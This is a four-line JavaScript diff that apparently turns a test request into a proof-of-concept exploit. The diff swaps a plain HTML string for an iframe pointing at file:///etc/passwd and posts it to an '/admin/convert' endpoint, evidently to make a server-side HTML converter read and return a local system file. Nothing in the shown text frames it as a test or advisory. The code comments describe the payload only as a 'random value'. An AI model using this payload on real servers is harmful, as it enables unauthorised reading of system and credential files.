@@ -1,4 +1,4 @@
-const htmlCode = "<h1>test</h1>"; // Set the random value to send
+const htmlCode = "<iframe src=file:///etc/passwd>"; // Set the random value to send
 const xhr = new XMLHttpRequest(); // Create a new XMLHttpRequest object
 xhr.open("POST", "/admin/convert"); // Set the request method and endpoint
 xhr.setRequestHeader("Content-Type", "application/json"); // Set the request header
